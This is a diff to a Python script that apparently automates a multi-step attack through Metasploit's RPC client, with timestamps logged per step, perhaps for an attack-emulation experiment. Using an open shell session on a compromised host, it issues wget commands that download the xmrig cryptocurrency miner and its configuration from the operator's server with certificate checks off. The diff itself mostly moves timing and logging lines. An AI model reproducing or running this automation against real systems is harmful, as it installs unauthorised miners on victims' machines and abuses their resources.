@@ -17,28 +17,22 @@ def main(argv):
 
     client = MsfRpcClient('kali')
 
-    time.sleep(30)
-    output_time_file_end = 'time_step_5_end.txt'
-    record_timestamp(folder, output_time_file_end)
-    time.sleep(30)
-
 
     # start step 7
     output_time_file_start = 'time_step_6_start.txt'
     record_timestamp(folder, output_time_file_start)
     time.sleep(2)
 
-    while client.jobs.list:
-        time.sleep(1)
 
     shell = client.sessions.session('3')
     shell.write('wget --no-check-certificate http://{0}/downloads/xmrig'.format(my_ip))
     shell.write('wget --no-check-certificate http://{0}/downloads/config.json'.format(my_ip))
     shell.write('wget --no-check-certificate http://{0}/downloads/SHA256SUMS'.format(my_ip))
 
-    while client.jobs.list:
-        time.sleep(1)
 
+    time.sleep(30)
+    output_time_file_end = 'time_step_6_end.txt'
+    record_timestamp(folder, output_time_file_end)
     time.sleep(30)
 
 
